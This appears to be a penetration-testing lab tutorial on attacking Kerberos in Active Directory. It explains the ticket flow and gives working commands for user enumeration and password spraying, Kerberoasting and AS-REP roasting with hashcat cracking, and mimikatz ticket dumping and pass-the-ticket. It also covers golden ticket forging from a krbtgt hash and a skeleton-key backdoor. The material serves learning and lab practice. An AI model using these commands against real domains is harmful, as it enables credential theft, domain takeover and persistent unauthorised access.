---
description: >-
  It is to be noted that kerberos can be attacked and tickets/hash fetched only
  after initial compromise or after knowing the username/password of the account
  on domain. It is a method of privilege esc
---

# Attacking Kerberos

Common Terminology

* **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
* **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
* **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
* **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
* **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
* **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
* **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
* **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
* **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
* **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

Working of Kerberos is simple. AS is responsible for verifying if the user actually has an account on the domain and TGS is responsible for generating the session key for the valid user. \
**SCENARIO:** A valid user wants to access SQL account for maintenance. This happens like following

<div align="left">

<img src="../../.gitbook/assets/image (28).png" alt="">

</div>

STEP 1 => AS-REQ (Authentication Service REQuest) => A user requests TGT from AS (Authentication Service) so that user can ask for a session key from TGS.\
**WHAT DOES THIS REQUEST CONTAIN?** The user encrypts the timestamp with his NT hash (password hash). AS then tries to decrypt and retrieve the timestamp using the NT hash stored in it's database (Since, KDC is the domain admin it has stored passwords of all domain accounts). IF the timestamp is a match, it then issues the TGT

STEP 2 => AS-REP (Authentication Service REPly) => AS verifies the client (as above) and issues an encrypted TGT.\
**HOW IS THIS ENCRYPTED?** A KDC LT Key (KDC Long Term Secret Key) encrypts the TGT and sends to the client.

STEP 3 => TGS-REQ (Ticket Granting Service REQuest) => The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) (here, SQL Service) of the service the client wants to access.

STEP 4 => TGS-REP (Ticket Granting Service REPly) => The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key (Service Ticket) for the service to the client.

**WHAT DOES SERVICE TICKET CONTAIN?** The service ticket contains User Details, Session Key and the TGS encrypts it with the service account's (SQL Service's) NTLM hash.

STEP 5 => AP-REQ => The client requests the service and sends the valid session key to prove the user has access

STEP 6 => AP-REP => The service grants access



**Attack Vectors?**\
1\. After step 4, Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash.

We can recover this Service Ticket and hash crack this NTLM to compromise the service account (SQL)

2\. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

## Kerberos Enumeration

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

Download Kerberute [here](https://github.com/ropnop/kerbrute/releases).

`echo "<ip>   CONTROLLER.local" >> /etc/hosts`

`./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`

Here, User.txt is the dictionary containing most common account names. This can be dowloaded [here](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt).

<div align="left">

<img src="../../.gitbook/assets/image (131).png" alt="">

</div>

## Harvesting TGT (Tickets) with Rubeus

Once you have the access to victim's PC, you can download rubeus on it and start harvesting session tickets. Once we have session tickets we can extract NT hash and compromise further accounts.

Download rubeus [here](https://github.com/GhostPack/Rubeus).

`Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

<div align="left">

<img src="../../.gitbook/assets/image (156) (1).png" alt="">

</div>

`Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.

<div align="left">

<img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt="">

</div>

## Kerberoasting

**Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.** If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.

`Rubeus.exe kerberoast`

Copy the hash onto your attacker machine and put it into a .txt file.\
`hashcat -m 13100 -a 0 hash.txt Pass.txt`

### Kerberoasting w/ Impacket

`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request`\
`hashcat -m 13100 -a 0 hash.txt Pass.txt`

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit.

## AS-REP Roasting

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

`Rubeus.exe asreproast`

<div align="left">

<img src="../../.gitbook/assets/image (95).png" alt="">

</div>

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

**hashcat -m 18200 hash.txt Pass.txt**

## Pass the Ticket using Mimikatz

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.

The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin

mimikatz.exe&#x20;

privilege::debug

<div align="left">

<img src="../../.gitbook/assets/image (79).png" alt="">

</div>

sekurlsa::tickets /export

<div align="left">

<img src="../../.gitbook/assets/image (27).png" alt="">

</div>

kerberos::ptt

<div align="left">

<img src="../../.gitbook/assets/image (115).png" alt="">

</div>

klist

<div align="left">

<img src="../../.gitbook/assets/image (80).png" alt="">

</div>

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

<div align="left">

<img src="../../.gitbook/assets/image (155).png" alt="">

</div>

## Golden and SIlver Ticket Attacks

* The **Kerberos Silver Ticket** is a valid Ticket Granting Service (TGS) Kerberos ticket since it is encrypted/signed by the service account configured with a [Service Principal Name](https://adsecurity.org/?p=230) for each server the Kerberos-authenticating service runs on.
* While a Golden ticket is a forged TGT valid for gaining access to any Kerberos service, the silver ticket is a forged TGS. This means the Silver Ticket scope is limited to whatever service is targeted on a specific server.

### KRBTGT Overview

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. **A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want**. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

\
**Dump the krbtgt hash**

`cd downloads && mimikatz.exe` \
`privilege::debug` \
`lsadump::lsa /inject /name:krbtgt`

<div align="left">

<img src="../../.gitbook/assets/image (26).png" alt="">

</div>

Generate golden ticket:

**`Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:1103`**

<div align="left">

<img src="../../.gitbook/assets/image (126) (1).png" alt="">

</div>

### Use the Golden/Silver Ticket to access other machines

misc::cmd

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

<div align="left">

<img src="../../.gitbook/assets/image (75).png" alt="">

</div>

## **Kerberos Skeleton (Backdoor)**

Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.

The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_"

#### Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

`privilege::debug`

`misc::skeleton`

`net use c:\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`

The share will now be accessible without the need for the Administrators password**.**

`dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
